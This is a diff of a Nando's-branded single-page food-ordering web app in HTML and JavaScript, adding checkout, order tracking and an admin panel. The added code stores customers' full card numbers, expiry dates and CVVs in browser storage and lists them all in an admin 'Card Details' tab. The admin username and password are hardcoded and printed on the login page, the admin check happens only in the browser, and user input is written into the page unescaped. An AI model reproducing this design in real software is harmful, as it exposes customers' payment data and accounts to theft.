@@ -7,9 +7,9 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary: #E31837; /* Nandos red */
+            --primary: #E31837;
             --primary-dark: #C4122F;
-            --secondary: #00A651; /* Fresh green */
+            --secondary: #00A651;
             --accent: #FFA500;
             --light: #F8F9FA;
             --dark: #212529;
@@ -129,6 +129,14 @@
 
         .btn-secondary:hover {
             background-color: #008F47;
+        }
+
+        .btn-logout {
+            background-color: #dc3545;
+        }
+
+        .btn-logout:hover {
+            background-color: #c82333;
         }
 
         /* OTP Modal */
@@ -649,6 +657,7 @@
             margin-bottom: 30px;
             border-bottom: 2px solid var(--light-gray);
             padding-bottom: 10px;
+            flex-wrap: wrap;
         }
 
         .admin-tab {
@@ -681,6 +690,8 @@
             width: 100%;
             border-collapse: collapse;
             margin-top: 20px;
+            overflow-x: auto;
+            display: block;
         }
 
         .admin-table th,
@@ -712,7 +723,12 @@
         }
 
         .delete-btn {
-            background: var(--danger);
+            background: #dc3545;
+            color: var(--white);
+        }
+
+        .view-btn {
+            background: var(--primary);
             color: var(--white);
         }
 
@@ -795,6 +811,48 @@
                 flex-direction: column;
                 gap: 15px;
             }
+
+            .admin-table {
+                display: block;
+                overflow-x: auto;
+            }
+        }
+
+        /* Badge for new orders */
+        .new-order-badge {
+            background: var(--primary);
+            color: white;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            margin-left: 10px;
+        }
+
+        /* Card Details Display */
+        .card-details-box {
+            background: var(--light);
+            border-radius: var(--radius);
+            padding: 20px;
+            margin-top: 20px;
+            border-left: 4px solid var(--primary);
+        }
+
+        /* Logout Button in Profile */
+        .logout-section {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 30px;
+            border-top: 2px solid var(--light-gray);
+        }
+
+        /* Order Details */
+        .order-card {
+            background: var(--white);
+            border-radius: var(--radius);
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow);
+            border-left: 4px solid var(--secondary);
         }
     </style>
 </head>
@@ -854,7 +912,7 @@
                 </div>
                 <button class="btn btn-secondary" id="verifyOTP" style="margin-top: 20px;">Verify & Login</button>
                 <p style="text-align: center; margin-top: 15px; font-size: 0.9rem; color: var(--gray);">
-                    Didn't receive code? <a href="#" style="color: var(--primary);">Resend</a>
+                    Didn't receive code? <a href="#" style="color: var(--primary);" id="resendOTP">Resend</a>
                 </p>
             </div>
         </div>
@@ -978,8 +1036,17 @@
                             <input type="text" id="cardName" class="form-control" placeholder="John Doe">
                         </div>
                         
+                        <div class="form-group">
+                            <label for="address">Delivery Address</label>
+                            <input type="text" id="address" class="form-control" placeholder="123 Main Street, London, UK" required>
+                        </div>
+                        
+                        <div style="margin: 20px 0; padding: 15px; background: var(--light); border-radius: var(--radius);">
+                            <i class="fas fa-info-circle"></i> Your card details will be saved for faster checkout next time.
+                        </div>
+                        
                         <button type="submit" class="btn" id="payNowBtn">
-                            <i class="fas fa-lock"></i> Pay Now
+                            <i class="fas fa-lock"></i> Pay Now & Place Order
                         </button>
                     </form>
                 </div>
@@ -998,7 +1065,7 @@
                         Thank you for your order. Your fast food will be delivered within 30 minutes.
                     </p>
                     <p style="margin-bottom: 30px;">
-                        Order ID: <strong>NANDOS-#2024-<span id="orderId">001</span></strong>
+                        Order ID: <strong id="orderIdDisplay">NANDOS-#2024-001</strong>
                     </p>
                     <button class="btn" id="continueShoppingBtn">Continue Shopping</button>
                 </div>
@@ -1020,16 +1087,25 @@
                     <h3 style="margin-bottom: 20px;">Order History</h3>
                     <div id="orderHistory">
                         <p style="color: var(--gray); text-align: center; padding: 20px;">
-                            No orders yet. Start shopping!
+                            Loading your orders...
                         </p>
                     </div>
-                    
+
                     <div class="section-divider"></div>
                     
-                    <h3 style="margin-bottom: 20px;">Saved Cards</h3>
+                    <h3 style="margin-bottom: 20px;">Saved Card Details</h3>
                     <div id="savedCards">
                         <p style="color: var(--gray); text-align: center; padding: 20px;">
-                            No saved cards yet.
+                            Loading your saved cards...
+                        </p>
+                    </div>
+
+                    <div class="logout-section">
+                        <button class="btn btn-logout" id="logoutBtn">
+                            <i class="fas fa-sign-out-alt"></i> Logout
+                        </button>
+                        <p style="margin-top: 15px; color: var(--gray); font-size: 0.9rem;">
+                            Logging out will clear your cart and require OTP verification next time.
                         </p>
                     </div>
                 </div>
@@ -1053,6 +1129,9 @@
                             <input type="password" id="adminPassword" class="form-control" placeholder="Enter password">
                         </div>
                         <button class="btn" id="adminLoginBtn">Login as Admin</button>
+                        <p style="text-align: center; margin-top: 20px; color: var(--gray); font-size: 0.9rem;">
+                            Use: Username: <strong>Husnain</strong>, Password: <strong>03038776223</strong>
+                        </p>
                     </div>
                 </div>
                 
@@ -1060,8 +1139,10 @@
                     <div class="admin-panel">
                         <div class="admin-tabs">
                             <button class="admin-tab active" data-tab="products">Products</button>
-                            <button class="admin-tab" data-tab="users">Users & Orders</button>
+                            <button class="admin-tab" data-tab="users">All Users</button>
                             <button class="admin-tab" data-tab="cards">Card Details</button>
+                            <button class="admin-tab" data-tab="orders">All Orders <span class="new-order-badge" id="newOrdersCount">0</span></button>
+                            <button class="admin-tab" data-tab="ordersWithCards">Orders with Cards</button>
                         </div>
                         
                         <!-- Products Tab -->
@@ -1070,7 +1151,7 @@
                             <button class="btn" id="addProductBtn" style="margin-bottom: 20px;">
                                 <i class="fas fa-plus"></i> Add New Product
                             </button>
-                            <table class="admin-table" id="productsTable">
+                            <table class="admin-table">
                                 <thead>
                                     <tr>
                                         <th>Image</th>
@@ -1086,16 +1167,21 @@
                             </table>
                         </div>
                         
-                        <!-- Users & Orders Tab -->
+                        <!-- Users Tab -->
                         <div class="admin-content" id="usersTab">
-                            <h3 style="margin-bottom: 20px;">Registered Users & Orders</h3>
+                            <h3 style="margin-bottom: 20px;">All Registered Users</h3>
+                            <div style="margin-bottom: 20px; color: var(--gray);">
+                                <i class="fas fa-users"></i> Total Users: <span id="totalUsersCount">0</span>
+                            </div>
                             <table class="admin-table">
                                 <thead>
                                     <tr>
-                                        <th>User</th>
+                                        <th>Email</th>
                                         <th>Phone</th>
-                                        <th>Orders</th>
+                                        <th>Registration Date</th>
+                                        <th>Total Orders</th>
                                         <th>Total Spent</th>
+                                        <th>Actions</th>
                                     </tr>
                                 </thead>
                                 <tbody id="usersTableBody">
@@ -1106,14 +1192,19 @@
                         
                         <!-- Card Details Tab -->
                         <div class="admin-content" id="cardsTab">
-                            <h3 style="margin-bottom: 20px;">Card Details</h3>
+                            <h3 style="margin-bottom: 20px;">All Saved Card Details</h3>
+                            <div style="margin-bottom: 20px; padding: 15px; background: var(--light); border-radius: var(--radius);">
+                                <i class="fas fa-shield-alt"></i> This section shows all card details saved by users during checkout.
+                            </div>
                             <table class="admin-table">
                                 <thead>
                                     <tr>
                                         <th>User</th>
                                         <th>Card Number</th>
+                                        <th>Name on Card</th>
                                         <th>Expiry</th>
                                         <th>CVV</th>
+                                        <th>Last Used</th>
                                         <th>Actions</th>
                                     </tr>
                                 </thead>
@@ -1121,12 +1212,46 @@
                                     <!-- Card details will be loaded here -->
                                 </tbody>
                             </table>
-                            <div style="margin-top: 30px; padding: 20px; background: var(--light); border-radius: var(--radius);">
-                                <h4 style="margin-bottom: 10px;">OTP Verification Simulation</h4>
-                                <p style="margin-bottom: 15px; color: var(--gray);">Simulate OTP verification for card transactions</p>
-                                <button class="btn btn-secondary" id="simulateOTPBtn">
-                                    <i class="fas fa-comment"></i> Simulate OTP Verification
+                        </div>
+                        
+                        <!-- Orders Tab -->
+                        <div class="admin-content" id="ordersTab">
+                            <h3 style="margin-bottom: 20px;">All Customer Orders</h3>
+                            <div style="display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap;">
+                                <button class="btn" id="markAllShipped" style="width: auto;">
+                                    <i class="fas fa-truck"></i> Mark All as Shipped
                                 </button>
+                                <button class="btn btn-secondary" id="refreshOrders" style="width: auto;">
+                                    <i class="fas fa-sync"></i> Refresh
+                                </button>
+                            </div>
+                            <table class="admin-table">
+                                <thead>
+                                    <tr>
+                                        <th>Order ID</th>
+                                        <th>Customer</th>
+                                        <th>Items</th>
+                                        <th>Total</th>
+                                        <th>Address</th>
+                                        <th>Status</th>
+                                        <th>Date</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="ordersTableBody">
+                                    <!-- Orders will be loaded here -->
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <!-- Orders with Cards Tab -->
+                        <div class="admin-content" id="ordersWithCardsTab">
+                            <h3 style="margin-bottom: 20px;">Orders with Card Details</h3>
+                            <p style="color: var(--gray); margin-bottom: 20px;">
+                                View complete order details including payment information used for each order.
+                            </p>
+                            <div id="ordersWithCardsContainer">
+                                <!-- Orders with card details will be loaded here -->
                             </div>
                         </div>
                     </div>
@@ -1183,6 +1308,7 @@
                             <option value="🍕">🍕 Pizza</option>
                             <option value="🥤">🥤 Drink</option>
                             <option value="🍗">🍗 Chicken</option>
+                            <option value="🌯">🌯 Wrap</option>
                         </select>
                     </div>
                     
@@ -1199,73 +1325,329 @@
         </div>
     </div>
 
+    <!-- View Card Details Modal -->
+    <div class="modal-overlay" id="viewCardModal" style="display: none;">
+        <div class="otp-modal" style="max-width: 500px;">
+            <div style="padding: 30px;">
+                <h3 style="margin-bottom: 20px;">Card Details</h3>
+                <div id="cardDetailsContent">
+                    <!-- Card details will be loaded here -->
+                </div>
+                <button class="btn" style="margin-top: 20px;" id="closeCardModal">
+                    Close
+                </button>
+            </div>
+        </div>
+    </div>
+
     <script>
-        // Application State
+        // ==============================
+        // SERVER STORAGE SYSTEM
+        // ==============================
+        class ServerStorage {
+            constructor() {
+                this.STORAGE_KEY = 'nandos_server_data_v2';
+                this.initServer();
+            }
+            
+            initServer() {
+                if (!localStorage.getItem(this.STORAGE_KEY)) {
+                    const initialData = {
+                        users: [],
+                        orders: [],
+                        products: this.getDefaultProducts(),
+                        cardDetails: [], // Stores ALL card details
+                        adminCredentials: {
+                            username: 'Husnain',
+                            password: '03038776223'
+                        }
+                    };
+                    this.saveData(initialData);
+                }
+            }
+            
+            getDefaultProducts() {
+                return [
+                    {
+                        id: 1,
+                        name: "Zinger Burger",
+                        price: 4.99,
+                        discount: 20,
+                        image: "🍔",
+                        originalPrice: 6.24
+                    },
+                    {
+                        id: 2,
+                        name: "Peri Peri Fries",
+                        price: 2.49,
+                        discount: 15,
+                        image: "🍟",
+                        originalPrice: 2.93
+                    },
+                    {
+                        id: 3,
+                        name: "Chicken Wrap",
+                        price: 3.99,
+                        discount: 20,
+                        image: "🌯",
+                        originalPrice: 4.99
+                    },
+                    {
+                        id: 4,
+                        name: "Pizza Slice",
+                        price: 1.99,
+                        discount: 25,
+                        image: "🍕",
+                        originalPrice: 2.65
+                    },
+                    {
+                        id: 5,
+                        name: "Coke + Fries Combo",
+                        price: 3.49,
+                        discount: 15,
+                        image: "🥤",
+                        originalPrice: 4.11
+                    },
+                    {
+                        id: 6,
+                        name: "Spicy Chicken Wings",
+                        price: 5.99,
+                        discount: 10,
+                        image: "🍗",
+                        originalPrice: 6.66
+                    }
+                ];
+            }
+            
+            getData() {
+                return JSON.parse(localStorage.getItem(this.STORAGE_KEY));
+            }
+            
+            saveData(data) {
+                localStorage.setItem(this.STORAGE_KEY, JSON.stringify(data));
+            }
+            
+            // User Management
+            addUser(user) {
+                const data = this.getData();
+                // Check if user already exists
+                const existingUser = data.users.find(u => u.email === user.email);
+                if (!existingUser) {
+                    user.id = Date.now();
+                    user.registrationDate = new Date().toISOString();
+                    user.totalOrders = 0;
+                    user.totalSpent = 0;
+                    user.lastLogin = new Date().toISOString();
+                    data.users.push(user);
+                    this.saveData(data);
+                } else {
+                    // Update last login
+                    existingUser.lastLogin = new Date().toISOString();
+                    this.saveData(data);
+                }
+                return user;
+            }
+            
+            getUserByEmail(email) {
+                const data = this.getData();
+                return data.users.find(u => u.email === email);
+            }
+            
+            getAllUsers() {
+                return this.getData().users;
+            }
+            
+            // Card Details Management
+            saveCardDetails(cardData) {
+                const data = this.getData();
+                
+                // Remove spaces from card number
+                cardData.cardNumber = cardData.cardNumber.replace(/\s/g, '');
+                
+                // Check if card already exists for this user
+                const existingIndex = data.cardDetails.findIndex(
+                    c => c.userEmail === cardData.userEmail && 
+                    c.cardNumber === cardData.cardNumber
+                );
+                
+                if (existingIndex !== -1) {
+                    // Update existing
+                    data.cardDetails[existingIndex] = {
+                        ...data.cardDetails[existingIndex],
+                        ...cardData,
+                        lastUsed: new Date().toISOString(),
+                        timesUsed: (data.cardDetails[existingIndex].timesUsed || 1) + 1
+                    };
+                } else {
+                    // Add new card
+                    cardData.id = 'CARD-' + Date.now();
+                    cardData.lastUsed = new Date().toISOString();
+                    cardData.timesUsed = 1;
+                    cardData.saveDate = new Date().toISOString();
+                    data.cardDetails.push(cardData);
+                }
+                
+                this.saveData(data);
+                return cardData;
+            }
+            
+            getCardsByUser(email) {
+                const data = this.getData();
+                return data.cardDetails.filter(card => card.userEmail === email)
+                    .sort((a, b) => new Date(b.lastUsed) - new Date(a.lastUsed));
+            }
+            
+            getAllCardDetails() {
+                return this.getData().cardDetails;
+            }
+            
+            // Order Management with Card Linking
+            addOrder(order) {
+                const data = this.getData();
+                order.id = 'ORD-' + Date.now();
+                order.orderDate = new Date().toISOString();
+                order.status = 'Pending';
+                order.cardLastFour = order.cardNumber ? order.cardNumber.slice(-4) : 'N/A';
+                
+                // Link card details to order if available
+                if (order.cardNumber) {
+                    order.linkedCard = {
+                        lastFour: order.cardNumber.slice(-4),
+                        name: order.cardName,
+                        expiry: order.expiry
+                    };
+                }
+                
+                data.orders.unshift(order); // Add to beginning
+                
+                // Update user stats
+                const user = data.users.find(u => u.email === order.userEmail);
+                if (user) {
+                    user.totalOrders = (user.totalOrders || 0) + 1;
+                    user.totalSpent = (user.totalSpent || 0) + order.total;
+                    user.lastOrderDate = new Date().toISOString();
+                }
+                
+                this.saveData(data);
+                return order;
+            }
+            
+            getOrdersByUser(email) {
+                const data = this.getData();
+                return data.orders.filter(order => order.userEmail === email)
+                    .sort((a, b) => new Date(b.orderDate) - new Date(a.orderDate));
+            }
+            
+            getAllOrders() {
+                return this.getData().orders;
+            }
+            
+            getOrdersWithCards() {
+                const data = this.getData();
+                return data.orders.filter(order => order.cardNumber);
+            }
+            
+            updateOrderStatus(orderId, status) {
+                const data = this.getData();
+                const order = data.orders.find(o => o.id === orderId);
+                if (order) {
+                    order.status = status;
+                    this.saveData(data);
+                    return true;
+                }
+                return false;
+            }
+            
+            markAllOrdersShipped() {
+                const data = this.getData();
+                data.orders.forEach(order => {
+                    if (order.status === 'Pending') {
+                        order.status = 'Shipped';
+                    }
+                });
+                this.saveData(data);
+            }
+            
+            // Product Management
+            getAllProducts() {
+                return this.getData().products;
+            }
+            
+            addProduct(product) {
+                const data = this.getData();
+                product.id = data.products.length > 0 ? 
+                    Math.max(...data.products.map(p => p.id)) + 1 : 1;
+                data.products.push(product);
+                this.saveData(data);
+                return product;
+            }
+            
+            updateProduct(productId, updates) {
+                const data = this.getData();
+                const index = data.products.findIndex(p => p.id === productId);
+                if (index !== -1) {
+                    data.products[index] = { ...data.products[index], ...updates };
+                    this.saveData(data);
+                    return true;
+                }
+                return false;
+            }
+            
+            deleteProduct(productId) {
+                const data = this.getData();
+                const initialLength = data.products.length;
+                data.products = data.products.filter(p => p.id !== productId);
+                this.saveData(data);
+                return data.products.length < initialLength;
+            }
+            
+            // Admin Authentication
+            verifyAdmin(username, password) {
+                const data = this.getData();
+                return data.adminCredentials.username === username && 
+                       data.adminCredentials.password === password;
+            }
+            
+            getPendingOrdersCount() {
+                const data = this.getData();
+                return data.orders.filter(order => order.status === 'Pending').length;
+            }
+            
+            // Get statistics
+            getStatistics() {
+                const data = this.getData();
+                return {
+                    totalUsers: data.users.length,
+                    totalOrders: data.orders.length,
+                    totalCards: data.cardDetails.length,
+                    pendingOrders: data.orders.filter(o => o.status === 'Pending').length,
+                    totalRevenue: data.orders.reduce((sum, order) => sum + order.total, 0)
+                };
+            }
+        }
+
+        // ==============================
+        // APPLICATION STATE
+        // ==============================
         const state = {
             currentUser: null,
             cart: [],
-            products: [
-                {
-                    id: 1,
-                    name: "Zinger Burger",
-                    price: 4.99,
-                    discount: 20,
-                    image: "🍔",
-                    originalPrice: 6.24
-                },
-                {
-                    id: 2,
-                    name: "Peri Peri Fries",
-                    price: 2.49,
-                    discount: 15,
-                    image: "🍟",
-                    originalPrice: 2.93
-                },
-                {
-                    id: 3,
-                    name: "Chicken Wrap",
-                    price: 3.99,
-                    discount: 20,
-                    image: "🌯",
-                    originalPrice: 4.99
-                },
-                {
-                    id: 4,
-                    name: "Pizza Slice",
-                    price: 1.99,
-                    discount: 25,
-                    image: "🍕",
-                    originalPrice: 2.65
-                },
-                {
-                    id: 5,
-                    name: "Coke + Fries Combo",
-                    price: 3.49,
-                    discount: 15,
-                    image: "🥤",
-                    originalPrice: 4.11
-                },
-                {
-                    id: 6,
-                    name: "Spicy Chicken Wings",
-                    price: 5.99,
-                    discount: 10,
-                    image: "🍗",
-                    originalPrice: 6.66
-                }
-            ],
-            users: [],
-            orders: [],
             isAdmin: false,
-            currentOTP: "4821"
+            currentOTP: null
         };
 
-        // DOM Elements
+        // Initialize server storage
+        const server = new ServerStorage();
+
+        // ==============================
+        // DOM ELEMENTS
+        // ==============================
         const loginPage = document.getElementById('loginPage');
         const mainApp = document.getElementById('mainApp');
         const otpModal = document.getElementById('otpModal');
         const loginForm = document.getElementById('loginForm');
         const verifyOTP = document.getElementById('verifyOTP');
+        const resendOTP = document.getElementById('resendOTP');
         const otpDigits = document.querySelectorAll('.otp-digit');
         const generatedOTP = document.getElementById('generatedOTP');
         const navLinks = document.querySelectorAll('.nav-link');
@@ -1281,6 +1663,9 @@
         const paymentForm = document.getElementById('paymentForm');
         const continueShoppingBtn = document.getElementById('continueShoppingBtn');
         const userInfo = document.getElementById('userInfo');
+        const orderHistory = document.getElementById('orderHistory');
+        const savedCards = document.getElementById('savedCards');
+        const logoutBtn = document.getElementById('logoutBtn');
         const adminLink = document.getElementById('adminLink');
         const footerAdminLink = document.getElementById('footerAdminLink');
         const adminLoginForm = document.getElementById('adminLoginForm');
@@ -1291,18 +1676,29 @@
         const productsTableBody = document.getElementById('productsTableBody');
         const usersTableBody = document.getElementById('usersTableBody');
         const cardsTableBody = document.getElementById('cardsTableBody');
+        const ordersTableBody = document.getElementById('ordersTableBody');
+        const ordersWithCardsContainer = document.getElementById('ordersWithCardsContainer');
         const addProductBtn = document.getElementById('addProductBtn');
         const addProductModal = document.getElementById('addProductModal');
         const addProductForm = document.getElementById('addProductForm');
         const cancelAddProduct = document.getElementById('cancelAddProduct');
-        const simulateOTPBtn = document.getElementById('simulateOTPBtn');
+        const markAllShipped = document.getElementById('markAllShipped');
+        const refreshOrders = document.getElementById('refreshOrders');
+        const totalUsersCount = document.getElementById('totalUsersCount');
+        const newOrdersCount = document.getElementById('newOrdersCount');
+        const orderIdDisplay = document.getElementById('orderIdDisplay');
+        const viewCardModal = document.getElementById('viewCardModal');
+        const cardDetailsContent = document.getElementById('cardDetailsContent');
+        const closeCardModal = document.getElementById('closeCardModal');
         const cardNumberInput = document.getElementById('cardNumber');
         const expiryInput = document.getElementById('expiry');
 
-        // Initialize the application
+        // ==============================
+        // INITIALIZATION
+        // ==============================
         function init() {
             // Check if user is already logged in
-            const savedUser = localStorage.getItem('nandos_user');
+            const savedUser = localStorage.getItem('nandos_current_user');
             if (savedUser) {
                 state.currentUser = JSON.parse(savedUser);
                 loginPage.style.display = 'none';
@@ -1312,63 +1708,53 @@
                 loadUserProfile();
                 
                 // Check if user is admin
-                if (state.currentUser.email === 'admin@gmail.com') {
+                if (state.currentUser.email === 'admin@gmail.com' || 
+                    server.verifyAdmin(state.currentUser.email, state.currentUser.password)) {
                     adminLink.style.display = 'flex';
                     state.isAdmin = true;
                 }
             }
-
-            // Load sample users for admin panel
-            loadSampleUsers();
         }
 
-        // Load sample users for admin panel
-        function loadSampleUsers() {
-            state.users = [
-                {
-                    email: "john@gmail.com",
-                    phone: "+447912345678",
-                    orders: 3,
-                    totalSpent: 45.67,
-                    cardDetails: {
-                        number: "4242424242424242",
-                        expiry: "12/25",
-                        cvv: "123",
-                        name: "John Doe"
-                    }
-                },
-                {
-                    email: "sarah@gmail.com",
-                    phone: "+447987654321",
-                    orders: 1,
-                    totalSpent: 18.99,
-                    cardDetails: {
-                        number: "5555555555554444",
-                        expiry: "06/24",
-                        cvv: "456",
-                        name: "Sarah Smith"
-                    }
-                },
-                {
-                    email: "mike@gmail.com",
-                    phone: "+447712345678",
-                    orders: 5,
-                    totalSpent: 89.50,
-                    cardDetails: {
-                        number: "378282246310005",
-                        expiry: "09/26",
-                        cvv: "789",
-                        name: "Mike Johnson"
-                    }
-                }
-            ];
+        // ==============================
+        // GENERATE RANDOM OTP
+        // ==============================
+        function generateRandomOTP() {
+            return Math.floor(1000 + Math.random() * 9000).toString();
         }
 
-        // Load products to homepage
+        // ==============================
+        // LOGOUT FUNCTION
+        // ==============================
+        function logout() {
+            if (confirm('Are you sure you want to logout?')) {
+                // Clear current user
+                localStorage.removeItem('nandos_current_user');
+                state.currentUser = null;
+                state.cart = [];
+                state.isAdmin = false;
+                
+                // Reset UI
+                loginPage.style.display = 'flex';
+                mainApp.style.display = 'none';
+                adminLink.style.display = 'none';
+                
+                // Clear login form
+                document.getElementById('email').value = '';
+                document.getElementById('phone').value = '';
+                
+                showNotification('You have been logged out successfully.');
+            }
+        }
+
+        // ==============================
+        // PRODUCT FUNCTIONS
+        // ==============================
         function loadProducts() {
             productsGrid.innerHTML = '';
+            const products = server.getAllProducts();
             
-            state.products.forEach(product => {
+            products.forEach(product => {
                 const discountedPrice = product.price;
                 const originalPrice = product.originalPrice || (product.price / (1 - product.discount / 100)).toFixed(2);
                 
@@ -1403,9 +1789,12 @@
             });
         }
 
-        // Add product to cart
+        // ==============================
+        // CART FUNCTIONS
+        // ==============================
         function addToCart(productId) {
-            const product = state.products.find(p => p.id === productId);
+            const products = server.getAllProducts();
+            const product = products.find(p => p.id === productId);
             
             if (!product) return;
             
@@ -1424,63 +1813,11 @@
             showNotification(`${product.name} added to cart!`);
         }
 
-        // Update cart count in navbar
         function updateCartCount() {
             const totalItems = state.cart.reduce((sum, item) => sum + item.quantity, 0);
             cartCount.textContent = totalItems;
         }
 
-        // Show notification
-        function showNotification(message) {
-            // Create notification element
-            const notification = document.createElement('div');
-            notification.style.cssText = `
-                position: fixed;
-                top: 20px;
-                right: 20px;
-                background: var(--secondary);
-                color: white;
-                padding: 15px 20px;
-                border-radius: var(--radius);
-                box-shadow: var(--shadow);
-                z-index: 1000;
-                animation: slideIn 0.3s ease;
-            `;
-            
-            notification.innerHTML = `
-                <i class="fas fa-check-circle" style="margin-right: 10px;"></i>
-                ${message}
-            `;
-            
-            document.body.appendChild(notification);
-            
-            // Remove after 3 seconds
-            setTimeout(() => {
-                notification.style.animation = 'slideOut 0.3s ease';
-                setTimeout(() => {
-                    document.body.removeChild(notification);
-                }, 300);
-            }, 3000);
-            
-            // Add CSS animation
-            if (!document.querySelector('#notification-styles')) {
-                const style = document.createElement('style');
-                style.id = 'notification-styles';
-                style.textContent = `
-                    @keyframes slideIn {
-                        from { transform: translateX(100%); opacity: 0; }
-                        to { transform: translateX(0); opacity: 1; }
-                    }
-                    @keyframes slideOut {
-                        from { transform: translateX(0); opacity: 1; }
-                        to { transform: translateX(100%); opacity: 0; }
-                    }
-                `;
-                document.head.appendChild(style);
-            }
-        }
-
-        // Load cart items
         function loadCartItems() {
             if (state.cart.length === 0) {
                 cartItems.innerHTML = `
@@ -1540,7 +1877,6 @@
             });
         }
 
-        // Update cart quantity
         function updateCartQuantity(productId, action) {
             const item = state.cart.find(item => item.id === productId);
             
@@ -1559,9 +1895,15 @@
             updateCartCount();
         }
 
-        // Load user profile
+        // ==============================
+        // USER PROFILE FUNCTIONS
+        // ==============================
         function loadUserProfile() {
             if (!state.currentUser) return;
+            
+            const user = server.getUserByEmail(state.currentUser.email);
+            const orders = server.getOrdersByUser(state.currentUser.email);
+            const userCards = server.getCardsByUser(state.currentUser.email);
             
             userInfo.innerHTML = `
                 <div class="info-item">
@@ -1577,49 +1919,105 @@
                     <span class="info-value">${state.currentUser.email === 'admin@gmail.com' ? 'Administrator' : 'Customer'}</span>
                 </div>
                 <div class="info-item">
+                    <span class="info-label">Total Orders</span>
+                    <span class="info-value">${orders.length}</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">Total Spent</span>
+                    <span class="info-value">£${orders.reduce((sum, order) => sum + order.total, 0).toFixed(2)}</span>
+                </div>
+                <div class="info-item">
                     <span class="info-label">Member Since</span>
-                    <span class="info-value">${new Date().toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' })}</span>
+                    <span class="info-value">${user ? new Date(user.registrationDate).toLocaleDateString() : 'Today'}</span>
                 </div>
             `;
-        }
-
-        // Switch between pages
-        function switchPage(pageId) {
-            // Hide all pages
-            pages.forEach(page => {
-                page.classList.remove('active');
-            });
             
-            // Show selected page
-            document.getElementById(pageId + 'Page').classList.add('active');
-            
-            // Load page-specific content
-            if (pageId === 'cart') {
-                loadCartItems();
-            } else if (pageId === 'profile') {
-                loadUserProfile();
-            } else if (pageId === 'admin') {
-                if (state.isAdmin) {
-                    adminLoginForm.style.display = 'none';
-                    adminPanel.style.display = 'block';
-                    loadAdminProducts();
-                    loadAdminUsers();
-                    loadAdminCards();
-                } else {
-                    adminLoginForm.style.display = 'block';
-                    adminPanel.style.display = 'none';
-                }
+            // Load order history
+            if (orders.length > 0) {
+                let ordersHTML = '<div style="max-height: 300px; overflow-y: auto;">';
+                orders.forEach(order => {
+                    ordersHTML += `
+                        <div class="order-card">
+                            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                                <strong>${order.id}</strong>
+                                <span style="color: var(--primary); font-weight: 600;">£${order.total.toFixed(2)}</span>
+                            </div>
+                            <div style="color: var(--gray); font-size: 0.9rem; margin-bottom: 10px;">
+                                <i class="far fa-calendar"></i> ${new Date(order.orderDate).toLocaleDateString()} • 
+                                <span style="padding: 2px 8px; border-radius: 12px; font-size: 0.8rem; 
+                                      background: ${order.status === 'Pending' ? '#FFEAA7' : 
+                                                    order.status === 'Shipped' ? '#A3E4D7' : '#D5DBDB'};">
+                                    ${order.status}
+                                </span>
+                            </div>
+                            <div style="font-size: 0.9rem;">
+                                ${order.items.length} item${order.items.length > 1 ? 's' : ''} • 
+                                ${order.address.substring(0, 30)}...
+                            </div>
+                            ${order.cardLastFour && order.cardLastFour !== 'N/A' ? 
+                                `<div style="margin-top: 10px; font-size: 0.85rem; color: var(--gray);">
+                                    <i class="far fa-credit-card"></i> Paid with card ending in ${order.cardLastFour}
+                                </div>` : ''
+                            }
+                        </div>
+                    `;
+                });
+                ordersHTML += '</div>';
+                orderHistory.innerHTML = ordersHTML;
+            } else {
+                orderHistory.innerHTML = `
+                    <p style="color: var(--gray); text-align: center; padding: 20px;">
+                        No orders yet. Start shopping!
+                    </p>
+                `;
             }
             
-            // Close mobile menu if open
-            navLinksContainer.classList.remove('active');
+            // Load saved cards
+            if (userCards.length > 0) {
+                let cardsHTML = '<div style="display: grid; gap: 15px;">';
+                userCards.forEach(card => {
+                    const maskedNumber = `**** **** **** ${card.cardNumber.slice(-4)}`;
+                    cardsHTML += `
+                        <div class="card-details-box">
+                            <div style="display: flex; justify-content: space-between; align-items: center;">
+                                <div>
+                                    <strong>${maskedNumber}</strong>
+                                    <div style="font-size: 0.9rem; color: var(--gray); margin-top: 5px;">
+                                        <i class="far fa-user"></i> ${card.cardName} • 
+                                        <i class="far fa-calendar"></i> ${card.expiry} •
+                                        Used ${card.timesUsed} time${card.timesUsed > 1 ? 's' : ''}
+                                    </div>
+                                </div>
+                                <div style="font-size: 1.5rem;">
+                                    ${card.cardNumber.startsWith('4') ? '💳' : 
+                                      card.cardNumber.startsWith('5') ? '💳' : '💳'}
+                                </div>
+                            </div>
+                            <div style="margin-top: 10px; font-size: 0.8rem; color: var(--gray);">
+                                Last used: ${new Date(card.lastUsed).toLocaleDateString()}
+                            </div>
+                        </div>
+                    `;
+                });
+                cardsHTML += '</div>';
+                savedCards.innerHTML = cardsHTML;
+            } else {
+                savedCards.innerHTML = `
+                    <p style="color: var(--gray); text-align: center; padding: 20px;">
+                        No saved cards yet. Your card will be saved after your first order.
+                    </p>
+                `;
+            }
         }
 
-        // Load admin products
+        // ==============================
+        // ADMIN FUNCTIONS
+        // ==============================
         function loadAdminProducts() {
             productsTableBody.innerHTML = '';
+            const products = server.getAllProducts();
             
-            state.products.forEach(product => {
+            products.forEach(product => {
                 const row = document.createElement('tr');
                 row.innerHTML = `
                     <td style="font-size: 1.5rem;">${product.image}</td>
@@ -1655,40 +2053,67 @@
             });
         }
 
-        // Load admin users
         function loadAdminUsers() {
             usersTableBody.innerHTML = '';
+            const users = server.getAllUsers();
+            const stats = server.getStatistics();
+            totalUsersCount.textContent = stats.totalUsers;
             
-            state.users.forEach(user => {
+            users.forEach(user => {
                 const row = document.createElement('tr');
                 row.innerHTML = `
                     <td>${user.email}</td>
                     <td>${user.phone}</td>
-                    <td>${user.orders} orders</td>
-                    <td>£${user.totalSpent.toFixed(2)}</td>
+                    <td>${new Date(user.registrationDate).toLocaleDateString()}</td>
+                    <td>${user.totalOrders || 0}</td>
+                    <td>£${(user.totalSpent || 0).toFixed(2)}</td>
+                    <td>
+                        <button class="action-btn view-btn" data-email="${user.email}">
